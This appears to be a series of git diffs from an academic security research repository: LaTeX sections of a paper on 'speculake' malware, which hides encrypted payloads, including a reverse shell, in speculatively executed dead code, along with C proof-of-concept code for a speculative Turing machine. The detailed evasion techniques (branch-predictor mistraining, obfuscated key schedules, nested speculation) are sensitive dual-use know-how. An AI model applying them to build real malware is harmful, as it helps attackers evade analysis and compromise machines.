-The \texttt{rep} instruction repeats the execution of string instructions a set
-number of times (set in a register). When set to repeat 90 or more times, these
-instructions are not speculated past, requiring they complete and be retired
-before looking to the next instruction. This appears to be due to the 
-\texttt{rep} instruction adding additional $\mu$ ops per instruction, we found
-that using the \texttt{rep} instruction caused $2n$ $\mu$ ops when the string
-operation works on $n$ bytes~\cite{uop_article}. Thus enough repetitions would cause instructions
-after the \texttt{rep} instruction to wait for the full repetition to be retired
-before beginning their execution.
-
-While this either new or repurposed instruction may provide some defense
-against \speculake there are clear drawbacks: 
-\begin{enumerate}
-    \item Code using this instruction will be slower to execute by design. The
-    purpose of this instruction is to deliberately slow the CPU and force it to
-    wait. This will lead to a direct trade-off of speed vs. security.
-
-    \item This will require a new set of APIs for basic library functions that
-    load and store data. It would be detrimental to require all loads and stores
-    never be speculated past, meaning there must be an option for choosing when
-    certain loads and stores are not to be speculated past. This comes with all
-    the usual drawbacks of modified APIs, un-updated systems, software engineers
-    unaware of the new API, or of the significance, or when speculation is
-    appropriate and when it is dangerous.
-\end{enumerate}
+By design these new instructions grant the operating system control over the
+state a program generates introducing possible attack vectors for malicious
+Operating Systems to poison the Branch History Buffer or even allow \speculake
+type attacks.
 
 \subsubsection{Malware Detection}
+\label{subsubsec:malware}
 The world of computer security is often referred to as an arms race, hackers and
@@
 generations of this malware.
+
+\subsubsection{Cache Poisoning}
+As mentioned in Section~\ref{subsubsec:malware} a vital component of \speculake
+is the ability to perform cache timings. Any mechanism that modifies the cache
+can affect the success of \speculake-like attacks.
+
+Drastic methods such as completely poisoning the cache will hinder this attack
+while also forcing almost all loads to result in a cache miss, effectively
+nullifying the point of cache.
+
+However, more conservative methods such as randomly loading values into cache
+can have a negative affect on \speculake-like attacks (causing the cache timing
+to predict incorrect values) while not having too detrimental of an affect on
+programs as a whole.
+
+In response to this method of defense \speculake-like attacks can modify the
+number of iterations and confidence thresholds necessary to determine a value.
+As mentioned in Section~\ref{subsec:impl-turing} our experiments found that it
+was only necessary to perform 50 iterations of our \texttt{target\_fn} in order
+to gain 80\% confidence in the value returned. While only 50 iterations are
+necessary, increasing this value to higher levels can lead to a significantly
+higher confidence with very little performance detriment (especially in the
+case of AES decryption).
+
+\subsection{Resilience of \speculake}
+Spectre works to use a cache side-channel to leak information from a process. As
+such defenses to Spectre work to limit the information available to a
+speculatively executing program. One such solution may be a new instruction such
+as  \texttt{specfence}: an instruction which designates to the CPU a point that
+cannot be speculated past. This would require that loads/stores after the
+\texttt{specfence} instruction would be on hold until loads/stores from before
+the \texttt{specfence} instruction have retired. The loads/stores after a
+\texttt{specfence} do not begin to execute at all until the loads/stores before
+the \texttt{specfence} retire.
+
+However effective such an instruction may be against Spectre, it is not a
+defense against \speculake. Such an instruction would be useful in restricting
+the execution of a program to restrict the speculative capabilities of program,
+thereby stopping information from being leaked. However, a malicious user
+creating \speculake malware would simply choose to not use this instruction.
+
+This demonstrates the versatility of speculative execution in general. While
+defenses against Spectre are needed, a more general purpose solution to
+speculative execution as a whole is necessary to address the wide range of its
+capabilities.
+
+% We note that this instruction seems to already exist, albeit unintentionally.
+% The \texttt{rep} instruction repeats the execution of string instructions a set
+% number of times (set in a register). When set to repeat 90 or more times, these
+% instructions are not speculated past, requiring they complete and be retired
+% before looking to the next instruction. This appears to be due to the 
+% \texttt{rep} instruction adding additional $\mu$ ops per instruction, we found
+% that using the \texttt{rep} instruction caused $2n$ $\mu$ ops when the string
+% operation works on $n$ bytes~\cite{uop_article}. Thus enough repetitions would cause instructions
+% after the \texttt{rep} instruction to wait for the full repetition to be retired
+% before beginning their execution.
 
@@
 key schedule makes \speculake useful in the domains of Digital Rights Management (DRM)
-and whoitebox cryptography more generally. 
+and whitebox cryptography more generally. 
 %% Approximate Computing

### 2018-05-08 paper/implementation.tex

@@
 critical computation of the decryption is done in the speculative world. 
+To further mask secure this decryption we make use of nested speculation 
+to obfuscate the key schedule, discussed in section~\ref{subsec:nested-spec}.
 
@@
 aditional bit doubles the search space that the \texttt{Flush+Reload} stage must 
-traverse.  So every bit shorter effectively doubles the throughput of the 
-emulator, and there is effectively no advantage to allowing variable length 
-instructions. Details of the SPASM instruction set can be found in 
-Appendix~\ref{appendix:spasm}.
+traverse.  So every bit shorter effectively doubles the throughput of the emulator~\footnote{Until it doesn't}, 
+and there is effectively no advantage to allowing variable length 
+instructions.
+
+In this model of computation there are no arguments as the speculative 
+primitive provides a limited number of bits. Each opcode performs a 
+specific operation on the registers in the state maintained by the emulator.
+While other small instruction set architectures exist, they either allow 
+exceptions to their instruction length, are too long even in reduced form, 
+or did not have significant support to make them favorable for developers.
+
+We have used 6 bits in the construction of this instruction set as our original
+goal was to limit the length of each opcode as much as possible. Given the result 
+demonstrated in figure~\ref{fig:spec_bandwidth} we have relaxed this goal a bit, as similar 
+performance can be acheived within a range of bits and other application 
+factors weigh on performance more than channel width.
 
@@
 a \textit{ReverseShell} program that opens and connects to a socket before  
-duplicating I/O file descriptors and executing a local shell.
+duplicating I/O file descriptors and executing a local shell. Details of the 
+SPASM instruction set can be found in Appendix~\ref{appendix:spasm}.
 
@@
 
+We note that an analyst might attempt to locate the speculative entry point by
+searching for AES-NI instructions in the payload program's dead code, ultimately
+discovering the keys that it uses. However, we find it is possible to overcome
+this by having the trigger program communicate the decryption key to the payload
+program via the branch predictor.
+
+To accomplish this, we use multiple speculative entry points, each that derive a
+different decryption key before calling a common decryption routine. Since
+the exact speculative entry point is determined by the trigger program, an
+analyst cannot discover the decryption key directly from the payload program.
+
+An analyst could still enumerate all potential entry points, testing each one
+until they find one that correctly decrypts the ciphertext. In a 1~MB binary,
+there are (at most) only 1~million entry points, providing just 20~bits of
+security.
+
+To increase security, we \emph{chain} entry points together. Rather than derive
+the key from a single entry point, we have each potential entry point perform
+another indirect jump that the CPU cannot immediately resolve, forcing it to
+speculate while already executing speculatively. The predicted target of that jump
+will also be determined by the trigger program. For example, if the trigger
+program makes 30 training jumps, followed by 10 additional indirect jumps, and
+the payload program performs the same 30 training jumps before a stall, the CPU
+will predict the payload program will also perform the next 10 jumps. If each
+jump has the potential to land in up to 1024 possible locations, this would
+provide in total $1024^{10} = 2^{100}$ possible keys, or 100~bits of security.
+We describe our implementation of this nested speculative execution concept in
+Section~\ref{subsec:nested-spec}.
+
 %%%%%%%%%%%%%%

### 2018-05-08 paper/related-work.tex
Expanded SPASM VM and reorganized nested speculation sections

@@
 web-based vulnerabilites~\cite{genkin2018drive} as well as hardware isolation  
-leaks in Intel's SGX~\cite{spectre_sgx}.
+leaks in Intel's SGX~\cite{spectre_sgx}. At the time of writing multiple sources
+have claimed new speculative execution related exploits termed \textit{Spectre-NG}
+have been reported to Intel and assigned CVE numbers. We have no details
+on content, though intel has labeled four as critical and another four 
+as intermediate security flaws~\cite{spectre_ng_gossip}.
 

### 2018-05-08 paper/payloads.tex

@@
 is possible in the speculative environment in spite of the constraints 
-imposed by the speculative world. However, a Turing Machine
+imposed. However, a Turing Machine
 is not an efficient or usable model for computation when
@@
 
-Using emulators in the "real world" allows for crafted binary programs to be
-instrumented in dead code and, as demonstrated in
-Section~\ref{subsec:decryption} encrypted and hidden. This gives an advantage to
-attackers as traditional reverse engineering methods will reveal only that
-emulation is being done. It reveals nothing about the ultimate goal of the
-program.
+Using emulators in the ``real world'' allows for binary programs to be
+placed encrypted and hidden in dead code and, as demonstrated in
+Section~\ref{subsec:decryption}.
+Traditional reverse engineering methods will reveal only that
+emulation is being done, while the program being emulated remains encrypted.
+Even when the trigger is running, only the parts of the code that execute would
+be revealed to a careful analyst observing the CPU's committed state, and the
+remainder of the emulated program would remain hidden.
 
-To accommodate both developers as well as the unique constraints 
-enforced by the speculative primitive, a custom emulation solution is required. 
-We have created a custom emulator and instruction set -- SPASM -- which 
-accommodate the speculative primitive specifically. This 
-provides a higher level of abstraction around the speculative primitive
-that we have used to implement various executable binaries.
+We design a custom emulator and instruction set---SPASM (Speculative
+Assembly)---that accommodates the constraints of the speculative primitive.
+SPASM is a 6-bit Instruction set, where all instructions (including operand,
+registers, and arguments) fit within 6-bits. This allows each step of the
+speculative world to emit a single SPASM instruction to the real world for
+emulation by a light-weight SPASM emulator. Using SPASM, developers can write
+programs, and assemble and encrypt them into a payload program. When the
+associated trigger program runs, the payload will decrypt SPASM instructions in
+the speculative world, and execute them one at a time.
 
@@
 We note that the \speculake model is not intrinsically linked to the SPASM emulator. 
-A wrapper could be implemented around other existing emulators to incrementally 
-construct instructions 6 or 8 bits at a time (depending on the channel width). 
+A wrapper could be implemented around other existing emulators to construct
+instructions incrementally through the fixed-width channel (e.g. using 4 8-bit
+reads to reveal a single 32-bit ARM instruction).
 This would allow for encrypted payloads to be written in higher level languages
-like C or C++, although there would be a significant performance reduction to 
-using this type of wrapper.
+like C or C++, and compiled to any target architecture the real-world emulator
+can execute.

### 2018-05-08 paper/architecture.tex

@@
 general purpose registers besides \texttt{\%rax} can be used as well}.
-We created a simple trigger program that performs a series of 32 indirect
+We created a simple trigger program that performs a series of 28 indirect
 branches
@@
 
-In our payload program, we first perform the same 32 indirect jumps. We ensure
+In our payload program, we first perform the same 28 indirect jumps. We ensure
 the source address of these jumps is the same as in the trigger program by
@@
 speculatively (and covertly) perform on the order of 100 arbitrary
-instructions, and communicate a short (e.g. single byte) result to the real
+instructions while an accompanying trigger program is running, and communicate
+a short (e.g. single byte) result to the real
 world via a cache side channel. These speculative instructions are able to read

### 2018-05-08 paper/implementation.tex

@@
 
+For each of these payloads, we used our custom trigger program that performs 28
+indirect jumps, followed by a final indirect jump to a function pointer that
+pointed to target function at address 0x430000. In each of our payload programs,
+we performed the same 28 indirect jumps and the final indirect jump with the
+function pointer with two differences: first, the function pointer was cleared
+from the cache (using the \texttt{clflush} instruction), and second, the
+function pointer pointed to a different destination (specifically, to a
+function
+that measured the cache side channel, recording the indexes in the probe array
+that appeared to be in the cache and then flushing all indexes).
+At address 0x430000, we placed our target
+function code for the payload program, which is never directly called
+(but executes speculatively). We note that this code must be loaded into the
+cache but otherwise need not be accessed directly.
+
 \subsection{Turing Machine}
@@
 
-We implemented a 5-state Busy Beaver Turing machine.
-This implementation led to the discovery of many of the limitations and
-capabilities of speculative execution.
+We implemented a 2-symbol 5-state Busy Beaver Turing machine logic in our speculative
+target function in the payload program. Our implementation reads a global state,
+tape, and position, and determines how the state, tape, and position should be
+updated. It encodes this update into a single byte, and loads from a global
+buffer indexed by that byte, loading it into cache.
+We randomized the stride length between indexes in
+this array to avoid the CPU's stride prediction from preemptively loading values
+in the buffer.
 
-We found that our implementation is able to examine the state and current symbol
+Our implementation is able to examine the state and current symbol
 on the Turing tape and make decisions based on these values as long as they are
-in cache. The subtlety here is that in order to enter this speculative execution
-the function pointer must be flushed from cache (causing the branch predictor to
-incorrectly predict the target function as the destination). As such, care must
-be taken to ensure that the function pointer and state to be used in the
-speculative execution must be in separate cache lines.
+in cache. If one of these becomes uncached, one of two things will happen.
+First, the speculative function may simply fail to report any result back to the
+real world, as the uncached read takes too long to return before the speculative
+world is squashed by the resolution of the function pointer. Second, the CPU may
+\emph{speculate} on the value of the uncached item, which may be incorrect. Of
+course, this does not affect the correctness of normal programs, but it does
+impact the correctness of our speculative code. In particular, the speculative
+target function will compute using an incorrect value of state or current
+symbol, and ultimately compute and report the wrong update.
 
-If the state is removed from cache, during the speculative execution the
-state is also speculated. This error is particularly devious, as it is not an
-error of bit flips, but rather the processor speculating what the state could
-be, meaning that the state it uses is a possible value, and is not simply a
-mutation.
+This error is particularly devious, as it is not an
+error of bit flips or noise, but rather the processor speculating what the
+speculative target function reads from memory. Thus, error correcting codes on
+the reported result do not improve the situation.
 
-In our model the real world keeps track of the Turing state and tape. The
-speculative world uses this information to load a specific value into cache. The
-real world then times the loading of these values to determine which value was
-loaded speculatively. This value is then used to update the state and tape and
-the process is repeated until a halt state is reached.
+%In our model the real world keeps track of the Turing state and tape. The
+%speculative world uses this information to load a specific value into cache. The
+%real world then times the loading of these values to determine which value was
+%loaded speculatively. This value is then used to update the state and tape and
+%the process is repeated until a halt state is reached.
 
-In order to have confidence the value loaded speculatively is correct we repeat
-the execution a number of times and look for the value that has the quickest
-real-world load time over each repetition, whichever value is quickest to load
-the most is then determined to be the ``correct'' value.
+In order to have confidence the speculative target function executed with the
+correct inputs and reported the computed result correctly, 
+we repeat the execution a number of times and look for the value that was
+detected as present in the cache most often over all the iterations.
 
-Our Turing implementation discovered that only 50 repetitions is sufficient for
-the real world to determine the correct value with over 80\% confidence.
+Our Turing implementation discovered that 50 repetitions is sufficient for
+the real world to determine the correct value, as the ``hit rate'' for any one
+iteration observing the correct value loaded in cache was over 80\%.
 
+\TODO{Ian: how many seconds did it take to complete?}
 We implemented the 5 state Busy Beaver configuration which requires over 47
@@
 The speculative world is able to take advantage of the AES-NI instructions to
-decrypt messages. In order to avoid detection (as well as reduce the computation
-that needs to be done in the speculative world) the key expansion can be done
-ahead of time. However, the key schedule does have a structure that could be
-detected by a reverse engineer. Thus 11 random round keys are selected. This
-obfuscated key schedule makes it more difficult for a reverse engineer to
-determine that there is encrypted content. Additionally since the content is
-only accessed when the correct trigger program is running the challenges facing
-a reverse engineer are great. We discuss further methods for obfuscating
-specualtive decryption in section~\ref{subsec:future-work}.
+decrypt messages. However, the speculative upper-limit of 220 instructions is not
+enough to allow us to compute the key expansion, even using the
+\texttt{aeskeygenassist} instructions. To avoid this, we preload the expanded
+key schedule into the program, rather than the key. We note that an analyst
+could observe the structure of a normal key schedule,
+but we can avoid this by simply selecting 11 random round keys (and encrypting
+using the same 11 round keys). We discuss further methods for obfuscating
+the key in Section~\ref{subsec:nested-spec}.
 
-We have implemented the AES decryption as a fundamental piece of the \speculake model,
-and we demonstrate that the speed at which information can be decrypted using the speculative 
-primitive is dependent on the configuration of the \speculake model. Specifically,
-the channel width and the required minimum signal strength determine the maximum
-throughput that can be achieved. As demonstrated in Figure~\ref{fig:spec_bandwidth} 
-between 6 and 8 bits channel width provides an idea of the maximum speed at which the 
-speculative primitive can be used with AES-NI instructions in the payload.
+We wrote our AES decryption payload in 35 x86\_64 instructions and 2 lines of C
+(which compiles to an additional 31 x86\_64 instructions). The payload
+implements AES-CTR mode decryption, reading a global index and returning the
+decrypted byte at that location in the ciphertext via the cache side channel.
+In this model, the speculative function decrypts a full 16-byte AES block each
+iteration, but only returns the bits specified by the index.
 
-While the \speculake model acheives only moderate decryption speed, the 
-critical computation of the decryption is done in the speculative world. 
-To further mask secure this decryption we make use of nested speculation 
-to obfuscate the key schedule, discussed in section~\ref{subsec:nested-spec}.
+We demonstrate the speed that information can be decrypted via the speculative
+world, and we vary the channel width of the side channel from 1 to 12 bit to
+measure its performance. At low channel width, reading from the cache side
+channel requires timing reads from only 2 locations, while at 12-bits, the side
+channel requires reading $2^{12}$ locations. On the flip side, there is a fixed
+overhead per iteration that favors increased channel width to maximize
+bandwidth. As shown in Figure~\ref{fig:spec_bandwidth}, 8 bits is the optimal
+side channel width, allowing us to decrypt over 5,000 bits per second (625
+Bytes/sec).
+
+%While the \speculake model acheives only moderate decryption speed, the 
+%critical computation of the decryption is done in the speculative world. 
+%To further mask secure this decryption we make use of nested speculation 
+%to obfuscate the key schedule, discussed in section~\ref{subsec:nested-spec}.
 
@@
 % \label{subsubsec:spasm}
-Constructing an emulator making use of the speculative primitive requires  
-a trade off in expresive capability versus speed. 
-We have implemented SPASM as a model using two pseudo-registers, and six 
-bit instruction length which allows for a relatively direct programming model 
+
+%Constructing an emulator making use of the speculative primitive requires  
+%a trade off in expresive capability versus speed. 
+We have implemented our custom instruction set architecture---SPASM---as a model
+using two pseudo-registers, and
+6-bit instruction length which allows for a relatively direct programming model
 in which structured values can be entered into memory locations before making
@@
 
-To acheive a balance with speed the number of bits in each instruction is both 
-fixed and minimized.  A variable length instruction would require that the 
-\texttt{Flush+Reload} stage search the maximum number of bits on each round, and each 
-aditional bit doubles the search space that the \texttt{Flush+Reload} stage must 
-traverse.  So every bit shorter effectively doubles the throughput of the emulator~\footnote{Until it doesn't}, 
-and there is effectively no advantage to allowing variable length 
-instructions.
+%To achieve a balance with speed the number of bits in each instruction is both 
+%fixed and minimized.  A variable length instruction would require that the 
+%\texttt{Flush+Reload} stage search the maximum number of bits on each round, and each 
+%aditional bit doubles the search space that the \texttt{Flush+Reload} stage must 
+%traverse.  So every bit shorter effectively doubles the throughput of the emulator~\footnote{Until it doesn't}, 
+%and there is effectively no advantage to allowing variable length 
+%instructions. 
+%
 
-In this model of computation there are no arguments as the speculative 
-primitive provides a limited number of bits. Each opcode performs a 
-specific operation on the registers in the state maintained by the emulator.
-While other small instruction set architectures exist, they either allow 
-exceptions to their instruction length, are too long even in reduced form, 
-or did not have significant support to make them favorable for developers.
+In this model of computation there are no instruction arguments, as we must
+return an entire instruction from the speculative world inside the limited-width
+cache side channel. Although other small
+instruction sets exist, they either allow variable instruction
+lengths, are too long even in reduced form, or did not have significant support
+to make them favorable for developers.
 
-We have used 6 bits in the construction of this instruction set as our original
-goal was to limit the length of each opcode as much as possible. Given the result 
-demonstrated in figure~\ref{fig:spec_bandwidth} we have relaxed this goal a bit, as similar 
-performance can be acheived within a range of bits and other application 
-factors weigh on performance more than channel width.
+We have used 6 bits in the construction of this instruction set as our
+goal is to limit the length of each opcode as much as possible. Note that this
+is different from the goal in maximizing bandwidth, as our goal now is to
+maximize instruction throughput.
 
-Using this model we have implemented multiple example programs that can be run
-as encrypted binaries in an \speculake payload. A \textit{HelloWorld} program 
-that prints to stdout. A \textit{FizzBuzz} program that demonstrates control 
-flow and arithmetic operations while printing to stdout. And finally,
-a \textit{ReverseShell} program that opens and connects to a socket before  
-duplicating I/O file descriptors and executing a local shell. Details of the 
-SPASM instruction set can be found in Appendix~\ref{appendix:spasm}.
+In SPASM we have implemented multiple example programs that can be run as
+encrypted binaries in an \speculake payload: First, a \textit{HelloWorld}
+program that prints to \texttt{stdout}. Next, a \texttt{FizzBuzz} program that
+demonstrates control flow and arithmetic operations while printing to stdout.
+And finally, a \textit{ReverseShell} program that opens and connects to a socket
+before  duplicating I/O file descriptors and executing a local shell. Details of
+the SPASM instruction set can be found in Appendix~\ref{appendix:spasm}.
 
@@
 
-For example, the \textit{ReverseShell} program makes six system calls to open a socket,
-connect to it, duplicate I/O file descriptors, and perform an execve
-systemcall to open a shell. This requires 355 SPASM instructions to complete. 
-The probe space for the 6-bit SPASM ISA requires a traversal of an array of size 64.
-When using a redundancy of 256 to establish confidence in the signal the entire 
-\textit{ReverseShell} program takes under 7 seconds to run once triggered.
+For example, the \textit{ReverseShell} program is 355 SPASM instructions, and
+makes six system calls to open a socket,
+connect to it, duplicate I/O file descriptors, and perform an \texttt{execve}
+system call to open a shell.
+In our tests using 256 iterations per decrypted instruction, the
+\textit{ReverseShell} program takes under 7 seconds to launch a reverse shell
+once triggered.
 
@@
 
-For these experiments, we disable ASLR for simplification, but note that the
-branch predictors can be used to determine ASLR offsets and our attack adjusted
+For these experiments, we disable ASLR for simplification, but note that
+branch predictors can also be used to determine ASLR offsets and our attack adjusted
 accordingly~\cite{evtyushkin2016jump}.
@@
 and 28,000 indirect jumps. We then searched for the longest repeated set of over
-30 indirect jumps that end with a unique jump (i.e. source and destination do
-not occur in the previous 30 indirect jumps).
+28-32 indirect jumps that end with a unique jump (i.e. source and destination do
+not occur in the previous 28-32 indirect jumps).
 
@@
 for these indirect jumps, and constructed a jump/ret chain at those addresses in
-our payload program. Our program would jump to the source address of a pair,
-which had a single \texttt{retq} instruction, which would pop the next
-destination off the stack and perform the indirect jump. At each destination
-address, we placed a static (direct) \texttt{jmpq} to bring execution to the
-next source address in our list. The final jump source/destination pair was not
-performed (and the destination was not pushed to the stack). However, we placed
-code at the destination address that loaded a value into the cache (our target
-function). The last pair's source performs an indirect jump that returns to our
+our payload program. Our program jumps to the source address of a pair,
+which has a single \texttt{retq} instruction, which pops the next
+destination off the stack and performs the indirect jump. At each destination
+address, we place a static (direct) \texttt{jmpq} to bring execution to the
+next source address in our list. The final jump source/destination pair is not
+performed (and its destination is not pushed to the stack). However, we place
+our target function code at the destination address, which loads a specific value
+into the cache.
+The last source in the 31 indirect jumps performs an indirect jump that returns to our
 payload program, which immediately times probing the cache to see if any value was
@@
 We ran these experiments on an Intel Haswell
-i5-4590 CPU, with OpenSSL and our payload program taskset to the same core.
+i5-4590 CPU, with OpenSSL and our payload program pinned to the same core using
+\texttt{taskset}.
 We induced the jump pattern in OpenSSL by running Apache benchmark against it to
@@
 provide in total $1024^{10} = 2^{100}$ possible keys, or 100~bits of security.
-We describe our implementation of this nested speculative execution concept in
-Section~\ref{subsec:nested-spec}.
+%We describe our implementation of this nested speculative execution concept in
+%Section~\ref{subsec:nested-spec}.
 

### 2018-05-08 paper/figures.tex
fixup figure

@@
         \includegraphics[width=0.4\textwidth]{figures/general_model.pdf}
-    \caption{ General model of speculative computation within the Measure 
-        process when triggered. \textit{Speculative Computation} has access
-        to all variables which do not require a memory transaction within
-        the current state of the process. The process can subsequently make
+    \caption{ General model of speculative computation within the Payload 
+        process when triggered. \textit{Speculative Computation} has read-only
+        access to all memory within the process, and returns a result via a
+        cache side channel (via the \texttt{probe\_array}).
+        The process can subsequently make
         \textit{Resultant Computations} based on the value returned from
-        \texttt{Flush+Reload} to update the state of the process. }
+        the cache side channel to update the state of the process. }
     \label{fig:general_model}

### 2018-05-08 paper/architecture.tex
Added VM experiment to limitations and Pass on Conclusion

@@
 
+\subsubsection{Hypervisors}
+For virtual environments that provide guests significant periods of access to 
+hardware resources, we have found that \speculake is viable in certain configurations.
+
+\texttt{Guest -> Guest (internal)} - When both trigger and payload are run internal to
+a single virtual machine the branch prediction is successfully trained in the payload
+program, though at a notably reduced hit rate. This can be overcome by using an 
+increased number of iterations to establish confidence.
+
+\texttt{Guest -> Host} - In a configuration where trigger runs on the guest while the 
+payload runs on the host we have found that \speculake also successfully trains the 
+branch predictor well enough retreive a signal. Again, this signal is significantly
+reduced, implying the hypercall context swtich from guest to host requires some 
+overhead. We note that processor affinity in a guest is not mapped to processor 
+affinity in the host, as the host assigns the vm to any available CPU, though 
+eventually the hypervisor will assign the vm back to the same core as the payload 
+program allowing progress to continue.
+
+\texttt{Host -> Guest} - When trigger runs on the host attempting to train the 
+branch predictor to influence a payload process in a guest we have found that 
+the payload receives no signal. This implies that the hypercall context switch 
+from the host to the guest is heavier and has a larger impact on branch history. 
+This matches with work done by the Project Zero team at Google which found that 
+hypervisors can be fingerprinted from within a vm using the branch 
+predictor~\cite{project_zero}.
+
+\texttt{Guest -> Guest (external)} - Configurations where trigger and payload 
+run on coresident virtual machines similarly show no signal for the same 
+reasons that host to guest \speculake fails. However, this has the added difficulty
+that virtual machines must be run on the same core or on a pair of 
+hyperthreaded cores.
+
 \subsubsection{Hyperthreading}

### 2018-05-08 paper/conclusion.tex
Added VM experiment to limitations and Pass on Conclusion

\section{Conclusion}

In this paper we present \speculake, a model for hiding computation in speculative 
execution that is fundamentally different than modern methods of obfuscating 
computation. Through a series of experiments we have classified the 
capabilities and limitations of this speculative primitive and demonstrated 
various example applications. The flexibility in these applications stemming 
from the general computation permitted speculatively allows for emulation, 
transparent and remote communication, and process level data encryption.  
As a result current analysis techniques for detecting process cooperation, 
and describing the behavior of program
binaries are no longer definitively reliable.

Given the parameters of the speculative primitive described in this work and
the benefits that speculative execution provides to an attacker, the 
feasability of an \speculake exploit is unfortunately high and is not limited 
to data side-channels or process isolation violations. The speculative primitive 
developed in this work not only provides a guarded form of 
computation, but also enables cryptographic protection against current
analysis and debugging techniques.

Software isolation techniques are critical in protecting against exploitation 
models, however, complex optimization has often neglected these principles in 
favor of performance. The stop-gap measures proposed in this work contain 
security and performance trade-offs, though we advocate for a more robust 
solution in future processor generations. Long term
solutions may require that we take a step backward before we can 
securely step forward.

### 2018-05-08 paper/discussion.tex
Added VM experiment to limitations and Pass on Conclusion

@@
 the payload program, and write in data from a local, or (as demonstrated in 
-section~\ref{subsec:nested-spec}) remote processes. For example, a payload program
+section~\ref{subsec:openssl}) remote processes. For example, a payload program
 can check a series of three distinct jump patterns corresponding to three different 
@@
 key schedule makes \speculake useful in the domains of Digital Rights Management (DRM)
-and whitebox cryptography more generally. 
+and whitebox cryptography, and apprimate computing fields. 
 %% Approximate Computing

### 2018-05-08 turing/turing.c
modifications to turing

@@ -76,6 +76,7 @@ void *map;
 // (mis)speculate and start processing this function.
 // In reality, the CPU will (eventually) call check_probes()
 // where we collect results and see what's in cache
+void update_state(uint8_t write, uint8_t move_right, uint8_t state) __attribute__((section(".targetfn"))); 
 void target_fn(void) __attribute__((section(".targetfn")));
 void end_target_fn(void);
 
@@ -112,7 +113,7 @@ uint64_t jmp_ptr;
 
 #define TURING_TAPE_LEN 1024*512
 uint8_t *turing_tape;
-uint8_t turing_state;
+uint64_t turing_state;
 uint8_t true_turing_state;
 uint8_t true_move_right;
 uint8_t true_write;
@@ -128,8 +129,8 @@ void updateState(uint8_t write, uint8_t move_right, uint8_t state){
     true_turing_state = state;
     true_move_right = move_right;
     true_write = write;
-    // true_max_i = (true_turing_state << 2) | ((true_move_right & 0x1) << 1) | (true_write & 0x1);
-    true_max_i = (state<<2)| (0 << 1) | (*turing_tape & 0x1);
+    true_max_i = (true_turing_state << 2) | ((true_move_right & 0x1) << 1) | (true_write & 0x1);
+    // true_max_i = (state<<2)| (0 << 1) | (*turing_tape & 0x1);
 }
 
 void true_turing(void){
@@ -311,11 +312,12 @@ void updateLocalState(uint8_t max_i, uint8_t *write, uint8_t *move_right){
     }
     #else
     // original
-    // turing_state = max_i >> 2;
-    // *move_right = (max_i >> 1) & 0x1;
-    // *write = max_i & 0x1;
+    turing_state = max_i >> 2;
+    *move_right = (max_i >> 1) & 0x1;
+    *write = max_i & 0x1;
 
     // update everything local
+/*
     turing_state = max_i >> 2;
     uint8_t symbol = max_i & 0x1;
     if (turing_state == 0) {    // A
@@ -334,6 +336,7 @@ void updateLocalState(uint8_t max_i, uint8_t *write, uint8_t *move_right){
         if (symbol == 0) {*write = 1; *move_right = 1; turing_state = 5;}
         else             {*write = 0; *move_right = 0; turing_state = 0;}
     }
+*/
     // switch(max_i) {
     //     case 2:
     //         *write = 1;
@@ -479,7 +482,9 @@ void measure() {
[…]

### 2018-05-08 turing/turing_target.c

@@ -12,28 +12,15 @@ extern uint8_t lookup[2][5];
 #endif
 
 extern uint8_t *turing_tape;
-extern uint8_t turing_state;
+extern uint64_t turing_state;
 
-// This will be an int 0-255 typically...
-void signal(uint64_t state)
-{
-    asm volatile ("mov (%%rcx), %%rax" :: "c"(&probe_buf[state*cur_probe_space]) : "rax");
-}
-
-
-void update_state(uint8_t write, uint8_t move_right, uint8_t state)
-{
-    // write is either 0 or 1 (for 2-symbol)
-    // move_right is 1 for R, 0 for L
-    // state is 0=A, 1=B, etc
-    // signal(((state << 2) | ((move_right&0x1) << 1) | (write & 0x1)) ^ rand_xor);
-    signal(((state << 2) | ((move_right&0x1) << 1) | (write & 0x1)));
-}
 
 #define L 0
 #define R 1
 
 void target_fn(void) __attribute__((section(".targetfn")));
+void signal(uint64_t) __attribute__((section(".targetfn")));
+void update_state(uint8_t write, uint8_t move_right, uint8_t state) __attribute__((section(".targetfn")));
 void target_fn(void)
 {
 
@@ -52,78 +39,59 @@ void target_fn(void)
     //      1   1LC 1RB 0LE 1LD 0LA
     //
     uint8_t symbol = *turing_tape;
-    // if (turing_state == 0) {    // A
-    //     if (symbol == 0) update_state(1, R, 1);
-    //     else             update_state(1, L, 2);
-    // } else if (turing_state == 1) { // B
-    //     if (symbol == 0) update_state(1, R, 2);
-    //     else             update_state(1, R, 1);
-    // } else if (turing_state == 2) { // C
-    //     if (symbol == 0) update_state(1, R, 3);
-    //     else             update_state(0, L, 4);
-    // } else if (turing_state == 3) { // D
-    //     if (symbol == 0) update_state(1, L, 0);
-    //     else             update_state(1, L, 3);
-    // } else if (turing_state == 4) { // E
-    //     if (symbol == 0) update_state(1, R, 5);
-    //     else             update_state(0, L, 0);
-    // }
+    if (turing_state == 0) {    // A
+        if (symbol == 0) update_state(1, R, 1);
+        else             update_state(1, L, 2);
+    } else if (turing_state == 1) { // B
+        if (symbol == 0) update_state(1, R, 2);
[…]

### 2018-05-08 paper/abstract.tex
abstract pass

@@
 We introduce \emph{\speculake}, which compiles arbitrary malicious code into a
-seemingly-benign payload binary. When a separate trigger program performs a specific
-pattern of indirect jumps, it (mis)trains the CPU's branch predictor. Subsequent
-executions of the payload binary with similar jumps causes the CPU to mispredict its
-branches and speculatively execute a malicious payload, which communicates
-results back to the real world via side channels.
+seemingly-benign payload binary. When a separate trigger program runs on the same
+machine, it mistrains the CPU's branch predictor, causing the payload program to
+\emph{speculatively} execute code, and communicating its results back to the
+rest of the payload program, changing its behavior.
 
@@
 
-Finally, we describe defenses, but in all honesty, you're probably not going to like
-them.
+%Finally, we describe defenses, but in all honesty, you're probably not going to like
+%them.
 
-We consider this to be a new thrust in attack vector research that harkens to work 
-done on hardware red-pills and weird machines. We demonstrate that unintended 
-functionality of architechture can be used to compose malicious programs with 
-new and different properties. This technique poses novel and unique challenges for 
-malware modeling efforts, as it forces an environment to either
-faithfully reproduce all hardware behaviors, or overcome a much larger burden of 
-reverse engineering.
+\speculake demonstrates a new kind of malware that evades existing reverse
+engineering and binary analysis techniques. Because its true functionality can be
+contained in seemingly unreachable dead code, and its control flow driven
+externally by any other program running at the same time, \speculake poses a
+novel threat to state-of-the-art malware analysis techniques.
+
+%We consider this to be a new thrust in attack vector research that harkens to work 
+%done on hardware red-pills and weird machines. We demonstrate that unintended 
+%functionality of architechture can be used to compose malicious programs with 
+%new and different properties. This technique poses novel and unique challenges for 
+%malware modeling efforts, as it forces an environment to either
